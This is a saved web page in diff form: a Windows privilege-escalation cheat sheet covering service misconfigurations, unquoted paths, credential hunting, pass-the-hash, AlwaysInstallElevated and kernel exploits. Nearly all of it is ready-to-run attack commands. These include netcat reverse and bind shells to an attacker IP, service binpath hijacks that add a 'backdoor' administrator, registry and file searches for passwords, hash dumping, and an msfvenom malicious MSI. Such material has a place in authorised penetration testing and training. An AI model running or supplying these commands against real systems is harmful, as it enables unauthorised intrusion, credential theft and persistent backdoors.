@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<!-- saved from url=(0026)https://guif.re/windowseop -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Windows elevation of privileges</title>
+        
+        <link rel="stylesheet" type="text/css" href="./Windows elevation of privileges_files/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://guif.re/assets/favicon.png">
+        <script async="" src="./Windows elevation of privileges_files/analytics.js.download"></script><script src="./Windows elevation of privileges_files/syntaxhighlighter.js.download"></script>
+    </head>
+    <body>
+        <fieldset class="box">
+            <legend>Windows elevation of privileges ToC</legend>
+                <ul>
+                    <li><span><a href="https://guif.re/windowseop#From%20RCE%20to%20shell">From RCE to shell</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%200:%20System%20info">EoP 0: System info</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services">EoP 1: Incorrect permissions in services</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%202:%20Find%20unquoted%20paths">EoP 2: Find unquoted paths</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%203:%20ClearText%20passwords%20(quick%20hits)">EoP 3: ClearText passwords (quick hits)</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%204:%20Pass%20the%20hash">EoP 4: Pass the hash</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%205:%20Services%20only%20available%20from%20loopback">EoP 5: Services only available from loopback</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%206:%20AlwaysInstallElevated">EoP 6: AlwaysInstallElevated</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%207:%20Vulnerable%20drivers">EoP 7: Vulnerable drivers</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%208:%20Kernel%20vulnerabilities">EoP 8: Kernel vulnerabilities</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Windows%20version%20map">Windows version map</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#EoP%209:%20Automated%20tools">EoP 9: Automated tools</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Useful%20commands">Useful commands</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Transferring%20files">Transferring files</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Metasploit">Metasploit</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Useful%20exploits">Useful exploits</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Windows%20MS11-080">Windows MS11-080</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#From%20admin%20to%20system">From admin to system</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#AV%20bypass">AV bypass</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Print%20proof">Print proof</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Access%20Check">Access Check</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#Windows%20hashes">Windows hashes</a></span></li>
+                    <li><span><a href="https://guif.re/windowseop#PoCs">PoCs</a></span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <a name="From RCE to shell"></a>
+            <legend>From RCE to shell</legend>
+                <p>Getting a shell in limited interpreters:</p>
+                <pre><code>$&nbsp;<span class="green">system</span>(<span class="green">"start cmd.exe /k $cmd"</span>)</code></pre>
+                <p>Bind cmd to a port:</p>
+                <pre><code>$&nbsp;nc.exe&nbsp;-Lp&nbsp;31337&nbsp;-vv&nbsp;-e&nbsp;cmd.exe</code></pre>
+                <p>Reverse shell:</p>
+                <pre><code>$&nbsp;nc.exe&nbsp;attacker_ip&nbsp;attacker_port&nbsp;-e&nbsp;cmd.exe</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 0: System info"></a>
+            <legend>EoP 0: System info</legend>
+                <p>Finding installed software, running processes, bind ports, and OS version might be critical to identify the right EoP vector.</p>
+                <p>Find installed patches, architecture, OS version</p>
+                <pre><code>$&nbsp;systeminfo</code></pre>
+                <p>Get exact OS version</p>
+                <pre><code>$&nbsp;type&nbsp;C:/Windows/system32/eula.txt</code></pre>
+                <p>Hostname.</p>
+                <pre><code>$&nbsp;hostname</code></pre>
+                <p>Find current user.</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;%username%</code></pre>
+                <pre><code>&gt;&nbsp;getuid</code></pre>
+                <p>List all users</p>
+                <pre><code>$&nbsp;net&nbsp;users</code></pre>
+                <p>Information about a user</p>
+                <pre><code>$&nbsp;net&nbsp;users&nbsp;Administrator</code></pre>
+                <p>Network information</p>
+                <pre><code>$&nbsp;ipconfig&nbsp;/all&nbsp;&amp;&nbsp;route&nbsp;print&nbsp;&amp;&nbsp;arp&nbsp;-a</code></pre>
+                <p>Environment</p>
+                <pre><code>$&nbsp;set</code></pre>
+                <p>List open connections</p>
+                <pre><code>$&nbsp;<span class="red">netstat</span>&nbsp;-aton</code></pre>
+                <p>Firewall information</p>
+                <pre><code>$&nbsp;netsh&nbsp;firewall&nbsp;show&nbsp;state
+$&nbsp;netsh&nbsp;firewall&nbsp;show&nbsp;config</code></pre>
+                <p>List scheduled tasks</p>
+                <pre><code>$&nbsp;schtasks&nbsp;/query&nbsp;/fo&nbsp;LIST&nbsp;/v</code></pre>
+                <p>List windows services</p>
+                <pre><code>$&nbsp;net&nbsp;start</code></pre>
+                <pre><code>$&nbsp;wmic&nbsp;service&nbsp;list&nbsp;brief</code></pre>
+                <pre><code>$&nbsp;tasklist&nbsp;/SVC</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 1: Incorrect permissions in services"></a>
+            <legend>EoP 1: Incorrect permissions in services</legend>
+                <p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</p>
+                <p>We are interested in services where permissions are: <strong>BUILTIN\Users</strong> with <strong>(F)</strong> or <strong>(C)</strong> or <strong>(M)</strong> for our group. More info about permissions:</p>
+                <pre><code><span class="blue">https://msdn.microsoft.com/en-us/library/bb727008.aspx</span></code></pre>
+                <p>Common exploitation payloads involve: Replacing the affecting binary with a reverse shell or a command that creates a new user and adds it to the Administrator group. Replace the affected service with your payload and  and restart the service running:</p>
+                <pre><code>$&nbsp;wmic&nbsp;service&nbsp;NAMEOFSERVICE&nbsp;call&nbsp;startservice
+net&nbsp;stop&nbsp;[service&nbsp;name]&nbsp;&amp;&amp;&nbsp;net&nbsp;start&nbsp;[service&nbsp;name]</code></pre>
+                <pre><code>$&nbsp;sc&nbsp;start/stop&nbsp;serviceName</code></pre>
+                <p>The following commands will print the affected services:</p>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;/f&nbsp;<span class="green">"tokens=2 delims='</span>=<span class="green">'"</span>&nbsp;%a&nbsp;<span class="blue">in</span>&nbsp;(<span class="green">'wmic service list full^|find /i "</span>pathname<span class="green">"^|find /i /v "</span>system32<span class="green">"'</span>)&nbsp;<span class="blue">do</span>&nbsp;@echo&nbsp;%a&nbsp;&gt;&gt;&nbsp;c:\windows\temp\permissions.txt
+$&nbsp;<span class="red">for</span>&nbsp;/f&nbsp;eol^=^<span class="green">"^ delims^=^"</span>&nbsp;%a&nbsp;<span class="blue">in</span>&nbsp;(c:\windows\temp\permissions.txt)&nbsp;<span class="blue">do</span>&nbsp;cmd.exe&nbsp;/c&nbsp;icacls&nbsp;<span class="green">"%a"</span></code></pre>
+                <p>If wmic is not available we can use sc.exe:</p>
+                <pre><code>$&nbsp;sc&nbsp;query&nbsp;state=&nbsp;all&nbsp;|&nbsp;findstr&nbsp;<span class="green">"SERVICE_NAME:"</span>&nbsp;&gt;&gt;&nbsp;Servicenames.txt
+FOR&nbsp;/F&nbsp;%i&nbsp;<span class="blue">in</span>&nbsp;(Servicenames.txt)&nbsp;<span class="blue">DO</span>&nbsp;<span class="red">echo</span>&nbsp;%i
+type&nbsp;Servicenames.txt
+FOR&nbsp;/F&nbsp;<span class="green">"tokens=2 delims= "</span>&nbsp;%i&nbsp;<span class="blue">in</span>&nbsp;(Servicenames.txt)&nbsp;<span class="blue">DO</span>&nbsp;@echo&nbsp;%i&nbsp;&gt;&gt;&nbsp;services.txt
+FOR&nbsp;/F&nbsp;%i&nbsp;<span class="blue">in</span>&nbsp;(services.txt)&nbsp;<span class="blue">DO</span>&nbsp;@sc&nbsp;qc&nbsp;%i&nbsp;|&nbsp;findstr&nbsp;<span class="green">"BINARY_PATH_NAME"</span>&nbsp;&gt;&gt;&nbsp;path.txt</code></pre>
+                <p>You can also manually check each service using cacls:</p>
+                <pre><code>$&nbsp;cacls&nbsp;<span class="green">"C:\path\to\file.exe"</span></code></pre>
+                <p>If you don't have access to vmic, you can do:</p>
+                <pre><code>$&nbsp;sc&nbsp;qc&nbsp;upnphost</code></pre>
+                <p>Windows XP SP1 is known to be vulnerable to EoP in <strong>upnphost</strong>. You get Administrator with:</p>
+                <pre><code>$&nbsp;sc&nbsp;config&nbsp;upnphost&nbsp;binpath=&nbsp;<span class="green">"C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"</span>
+sc&nbsp;config&nbsp;upnphost&nbsp;obj=&nbsp;<span class="green">".\LocalSystem"</span>&nbsp;password=&nbsp;<span class="green">""</span>
+sc&nbsp;qc&nbsp;upnphost</code></pre>
+                <p>If it fails because of a missing dependency, run the following:</p>
+                <pre><code>$&nbsp;sc&nbsp;config&nbsp;SSDPSRV&nbsp;start=&nbsp;auto
+net&nbsp;start&nbsp;SSDPSRV
+net&nbsp;start&nbsp;upnphost</code></pre>
+                <p>Or remove the dependency:</p>
+                <pre><code>$&nbsp;sc&nbsp;config&nbsp;upnphost&nbsp;depend=&nbsp;<span class="green">""</span></code></pre>
+                <p>Using meterpreter:</p>
+                <pre><code>&gt;&nbsp;exploit/windows/local/service_permissions</code></pre>
+                <p>If wmic and sc is not available, you can use accesschk. For Windows XP, version 5.2 of accesschk is needed:</p>
+                <pre><code><span class="blue">https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</span></code></pre>
+                <pre><code>$&nbsp;accesschk.exe&nbsp;-uwcqv&nbsp;<span class="green">"Authenticated Users"</span>&nbsp;*&nbsp;/accepteula
+$&nbsp;accesschk.exe&nbsp;-qdws&nbsp;<span class="green">"Authenticated Users"</span>&nbsp;C:\Windows\&nbsp;/accepteula
+$&nbsp;accesschk.exe&nbsp;-qdws&nbsp;Users&nbsp;C:\Windows\</code></pre>
+                <p>Then query the service using Windows sc:</p>
+                <pre><code>$&nbsp;sc&nbsp;qc&nbsp;&lt;vulnerable&nbsp;service&nbsp;name&gt;</code></pre>
+                <p>Then change the binpath to execute your own commands (restart of the service will most likely be needed):</p>
+                <pre><code>$&nbsp;sc&nbsp;config&nbsp;&lt;vuln-service&gt;&nbsp;binpath=&nbsp;<span class="green">"net user backdoor backdoor123 /add"</span>
+$&nbsp;sc&nbsp;stop&nbsp;&lt;vuln-service&gt;
+$&nbsp;sc&nbsp;start&nbsp;&lt;vuln$&nbsp;-service&gt;
+$&nbsp;sc&nbsp;config&nbsp;&lt;vuln-service&gt;&nbsp;binpath=&nbsp;<span class="green">"net localgroup Administrators backdoor /add"</span>
+$&nbsp;sc&nbsp;stop&nbsp;&lt;vuln-service&gt;
+$&nbsp;sc&nbsp;start&nbsp;&lt;vuln-service&gt;</code></pre>
+                <p>Note - Might need to use the depend attribute explicitly:</p>
+                <pre><code>$&nbsp;sc&nbsp;stop&nbsp;&lt;vuln-service&gt;
+sc&nbsp;config&nbsp;&lt;vuln-service&gt;&nbsp;binPath=&nbsp;<span class="green">"c:\inetpub\wwwroot\runmsf.exe"</span>&nbsp;depend=&nbsp;<span class="green">""</span>&nbsp;start=&nbsp;demand&nbsp;obj=&nbsp;<span class="green">".\LocalSystem"</span>&nbsp;password=&nbsp;<span class="green">""</span>
+sc&nbsp;start&nbsp;&lt;vuln-service&gt;</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 2: Find unquoted paths"></a>
+            <legend>EoP 2: Find unquoted paths</legend>
+                <p>If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every whitespace, to find the binary in every intermediate folder.</p>
+                <p>For example, the following path would be vulnerable:</p>
+                <pre><code>C:\Program&nbsp;Files\something\winamp.exe</code></pre>
+                <p>We could place our payload with any of the following paths:</p>
+                <pre><code>C:\Program.exe</code></pre>
+                <pre><code>C:\Program&nbsp;Files.exe</code></pre>
+                <p>The following command will display affected services:</p>
+                <pre><code>$&nbsp;wmic&nbsp;service&nbsp;get&nbsp;name,displayname,pathname,startmode&nbsp;|findstr&nbsp;/i&nbsp;<span class="green">"Auto"</span>&nbsp;|findstr&nbsp;/i&nbsp;/v&nbsp;<span class="green">"C:\Windows\\"</span>&nbsp;|findstr&nbsp;/i&nbsp;/v&nbsp;<span class="green">""</span>"</code></pre>
+                <p>We might even be able to override the service executable, always check out the permissions of the service binary:</p>
+                <pre><code>$&nbsp;icacls&nbsp;<span class="green">"C:\Program Files (x86)\Program Folder"</span></code></pre>
+                <p>You can autoamte with meterpreter:</p>
+                <pre><code>&gt;&nbsp;exploit/windows/local/trusted_service_path</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 3: ClearText passwords (quick hits)"></a>
+            <legend>EoP 3: ClearText passwords (quick hits)</legend>
+                <p>We might somtetimes find passwords in arbitrary files, you can find them running:</p>
+                <pre><code>$&nbsp;findstr&nbsp;/si&nbsp;password&nbsp;*.txt
+findstr&nbsp;/si&nbsp;password&nbsp;*.xml
+findstr&nbsp;/si&nbsp;password&nbsp;*.ini</code></pre>
+                <p>Find all those strings in config files.</p>
+                <pre><code>$&nbsp;dir&nbsp;/s&nbsp;*pass*&nbsp;==&nbsp;*cred*&nbsp;==&nbsp;*vnc*&nbsp;==&nbsp;*.config*</code></pre>
+                <p>Find all passwords in all files.</p>
+                <pre><code>$&nbsp;findstr&nbsp;/spin&nbsp;<span class="green">"password"</span>&nbsp;*.*</code></pre>
+                <pre><code>$&nbsp;findstr&nbsp;/spin&nbsp;<span class="green">"password"</span>&nbsp;*.*</code></pre>
+                <p>These are common files to find them in. They might be base64-encoded. So look out for that.</p>
+                <pre><code>$&nbsp;type&nbsp;c:\sysprep.inf
+type&nbsp;c:\sysprep\sysprep.xml
+type&nbsp;c:\unattend.xml
+type&nbsp;%WINDIR%\Panther\Unattend\Unattended.xml
+type&nbsp;%WINDIR%\Panther\Unattended.xml</code></pre>
+                <pre><code>$&nbsp;dir&nbsp;c:*vnc.ini&nbsp;/s&nbsp;/b
+dir&nbsp;c:*ultravnc.ini&nbsp;/s&nbsp;/b
+dir&nbsp;c:\&nbsp;/s&nbsp;/b&nbsp;|&nbsp;findstr&nbsp;/si&nbsp;*vnc.ini</code></pre>
+                <p>Stuff in the registry:</p>
+                <pre><code>$&nbsp;reg&nbsp;query&nbsp;HKLM&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s
+reg&nbsp;query&nbsp;HKCU&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s
+reg&nbsp;query&nbsp;<span class="green">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span>
+reg&nbsp;query&nbsp;<span class="green">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span>
+reg&nbsp;query&nbsp;<span class="green">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span>
+reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4&nbsp;/v&nbsp;password</code></pre>
+                <p>Search for password in registry</p>
+                <pre><code>$&nbsp;reg&nbsp;query&nbsp;HKLM&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s
+reg&nbsp;query&nbsp;HKCU&nbsp;/f&nbsp;password&nbsp;/t&nbsp;REG_SZ&nbsp;/s</code></pre>
+                <p>Using meterpreter:</p>
+                <pre><code>&gt;&nbsp;post/windows/gather/credentials/gpp
+&gt;&nbsp;post/windows/gather/enum_unattend</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 4: Pass the hash"></a>
+            <legend>EoP 4: Pass the hash</legend>
+                <p>Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.</p>
+                <p>Windows hash format:</p>
+                <pre><code>user:group:id:ntlmpassword::</code></pre>
+                <p>You can do a hash dump in the affected system running:</p>
+                <pre><code>wce32.exe&nbsp;-w
+wce64.exe&nbsp;-w
+fgdump.exe</code></pre>
+                <p>Download and run fgdump.exe on the target machine.</p>
+                <pre><code>&nbsp;$&nbsp;<span class="red">cd</span>&nbsp;/usr/share/windows-binaries/fgdump;&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80</code></pre>
+                <pre><code>$&nbsp;pth-winexe&nbsp;-U&nbsp;DOMAIN/user%hash&nbsp;//$ip&nbsp;cmd</code></pre>
+                <p>or:</p>
+                <pre><code><span class="red">export</span>&nbsp;SMBHASH=xxx
+$&nbsp;pth-winexe&nbsp;-U&nbsp;user%&nbsp;&nbsp;//$ip&nbsp;cmd</code></pre>
+                <p>You can also do run as, with the hash:</p>
+                <p>Technique 1:</p>
+                <pre><code>C:\Windows\System32\runas.exe&nbsp;/env&nbsp;/noprofile&nbsp;/user:&lt;username&gt;&nbsp;&lt;password&gt;&nbsp;<span class="green">"c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"</span></code></pre>
+                <p>Technique 2:</p>
+                <pre><code>$&nbsp;secpasswd&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;<span class="green">"&lt;password&gt;"</span>&nbsp;-AsPlainText&nbsp;-Force
+$&nbsp;mycreds&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential&nbsp;(<span class="green">"&lt;user&gt;"</span>,&nbsp;$secpasswd)
+$&nbsp;computer&nbsp;=&nbsp;<span class="green">"&lt;hostname&gt;"</span><span class="green">
+[System.Diagnostics.Process]::Start</span>(<span class="green">"C:\users\public\nc.exe"</span>,<span class="green">"&lt;attacker_ip&gt; 4444 -e cmd.exe"</span>,&nbsp;$mycreds.Username,&nbsp;$mycreds.Password,&nbsp;$computer)</code></pre>
+                <pre><code>$&nbsp;powershell&nbsp;-ExecutionPolicy&nbsp;Bypass&nbsp;-File&nbsp;c:\users\public\r.ps1</code></pre>
+                <p>Technique 3:</p>
+                <pre><code>$&nbsp;psexec64&nbsp;\\COMPUTERNAME&nbsp;-u&nbsp;Test&nbsp;-p&nbsp;test&nbsp;-h&nbsp;<span class="green">"c:\users\public\nc.exe -nc &lt;attacker_ip&gt; 4444 -e cmd.exe"</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 5: Services only available from loopback"></a>
+            <legend>EoP 5: Services only available from loopback</legend>
+                <p>You can find services bind to the loopback interface that are not reachable through the network running.look for <strong>LISTENING/LISTEN</strong>:</p>
+                <pre><code><span class="red">netstat</span>&nbsp;-ano</code></pre>
+                <p>Port forward using plink</p>
+                <pre><code>$&nbsp;plink.exe&nbsp;-l&nbsp;root&nbsp;-pw&nbsp;mysecretpassword&nbsp;<span class="blue">192.168.0.101</span>&nbsp;-R&nbsp;<span class="blue">8080:127.0.0.1:8080</span></code></pre>
+                <p>Port forward using meterpreter</p>
+                <pre><code>$&nbsp;portfwd&nbsp;add&nbsp;-l&nbsp;&lt;attacker&nbsp;port&gt;&nbsp;-p&nbsp;&lt;victim&nbsp;port&gt;&nbsp;-r&nbsp;&lt;victim&nbsp;ip&gt;
+portfwd&nbsp;add&nbsp;-l&nbsp;3306&nbsp;-p&nbsp;3306&nbsp;-r&nbsp;<span class="blue">192.168.1.101</span></code></pre>
+                <p>If powershell is blocked, you can download:</p>
+                <pre><code><span class="blue">https://github.com/Ben0xA/nps</span></code></pre>
+                <p>Once you know the updates installed, you can find known exploits using windows-exploit-suggester.</p>
+                <pre><code>$&nbsp;./windows-exploit-suggester.py&nbsp;-d&nbsp;2017-02-09-mssb.xls&nbsp;-p&nbsp;ms16-075
+[*]&nbsp;initiating&nbsp;winsploit&nbsp;version&nbsp;3.2…
+[*]&nbsp;database&nbsp;file&nbsp;detected&nbsp;<span class="blue">as</span>&nbsp;xls&nbsp;<span class="blue">or</span>&nbsp;xlsx&nbsp;based&nbsp;on&nbsp;extension
+[*]&nbsp;searching&nbsp;all&nbsp;kb’s&nbsp;<span class="red">for</span>&nbsp;bulletin&nbsp;id&nbsp;MS16-075
+[+]&nbsp;relevant&nbsp;kbs&nbsp;[‘3164038’,&nbsp;‘3163018’,&nbsp;‘3163017’,&nbsp;‘3161561’]
+[*]&nbsp;done</code></pre>
+                <p>Compile windows exploit in linux:</p>
+                <pre><code>$&nbsp;i686-w64-mingw32-gcc&nbsp;18176.c&nbsp;-lws2_32&nbsp;-o&nbsp;18176.exe</code></pre>
+                <p>Compiling python scripts to executables:</p>
+                <pre><code>$&nbsp;wine&nbsp;~/.wine/drive_c/Python27/Scripts/pyinstaller.exe&nbsp;--onefile&nbsp;18176.py</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 6: AlwaysInstallElevated"></a>
+            <legend>EoP 6: AlwaysInstallElevated</legend>
+                <p><strong>AlwaysInstallElevated</strong> is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.</p>
+                <p>Check if these 2 registry values are set to "1":</p>
+                <pre><code>$&nbsp;reg&nbsp;query&nbsp;HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer&nbsp;/v&nbsp;AlwaysInstallElevated
+reg&nbsp;query&nbsp;HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer&nbsp;/v&nbsp;AlwaysInstallElevated</code></pre>
+                <p>If they are, create your own malicious msi:</p>
+                <pre><code>$&nbsp;msfvenom&nbsp;-p&nbsp;windows/adduser&nbsp;USER=backdoor&nbsp;PASS=backdoor123&nbsp;-f&nbsp;msi&nbsp;-o&nbsp;evil.msi</code></pre>
+                <p>Then use msiexec on victim to execute your msi:</p>
+                <pre><code>$&nbsp;msiexec&nbsp;/quiet&nbsp;/qn&nbsp;/i&nbsp;C:\evil.msi</code></pre>
+                <p>Metasploit module:</p>
+                <pre><code>&gt;&nbsp;use&nbsp;exploit/windows/local/always_install_elevated</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 7: Vulnerable drivers"></a>
+            <legend>EoP 7: Vulnerable drivers</legend>
+                <p>Third party drivers might contain vulnerabilities, find them running:</p>
+                <pre><code>$&nbsp;DRIVERQUERY</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 8: Kernel vulnerabilities"></a>
+            <legend>EoP 8: Kernel vulnerabilities</legend>
+                <p>Run exploit suggester against systeminfo:</p>
+                <pre><code><span class="blue">https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py</span></code></pre>
+                <pre><code>$&nbsp;python&nbsp;windows-exploit-suggester.py&nbsp;-d&nbsp;2017-05-27-mssb.xls&nbsp;-i&nbsp;systeminfo.txt</code></pre>
+                <p>Find installed paths:</p>
+                <pre><code>$&nbsp;wmic&nbsp;qfe&nbsp;get&nbsp;Caption,Description,HotFixID,InstalledOn</code></pre>
+                <p>Comprehensive talbes of vulnerabilities below:</p>
+                <pre><code>eDB&nbsp;&nbsp;&nbsp;Vuln&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2003&nbsp;&nbsp;&nbsp;&nbsp;2008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vista&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7
+271&nbsp;&nbsp;&nbsp;Lsasrv.dll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS04-011&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+350&nbsp;&nbsp;&nbsp;Util&nbsp;Manager&nbsp;&nbsp;&nbsp;MS04-019&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+351&nbsp;&nbsp;&nbsp;POSIX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS04-020&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+352&nbsp;&nbsp;&nbsp;Univ&nbsp;lang.&nbsp;UtilMS04-019&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+355&nbsp;&nbsp;&nbsp;Univ&nbsp;lang.&nbsp;UtilMS04-019&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1149&nbsp;&nbsp;PnP&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;MS05-039&nbsp;&nbsp;P4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1197&nbsp;&nbsp;keybd_event&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1198&nbsp;&nbsp;CSRSS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS05-018&nbsp;&nbsp;SP3,4&nbsp;&nbsp;&nbsp;&nbsp;SP1,2&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1407&nbsp;&nbsp;Kernel&nbsp;APC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS05-055&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
